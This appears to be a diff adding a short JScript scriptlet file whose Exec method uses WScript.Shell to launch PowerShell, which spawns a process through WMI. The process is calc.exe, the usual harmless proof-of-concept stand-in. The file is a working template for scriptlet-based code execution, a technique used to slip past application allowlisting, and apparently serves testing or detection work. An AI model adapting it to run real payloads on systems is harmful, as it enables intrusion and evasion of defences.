@@ -1,0 +1,19 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<public>
+    <method name="Exec"></method>
+</public>
+
+<script language="JScript">
+<![CDATA[
+
+function Exec()
+{
+    var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -c \"Invoke-WmiMethod win32_process -Name create -ArgumentList calc.exe\"");
+}
+
+]]>
+</script>
+
+</scriptlet>
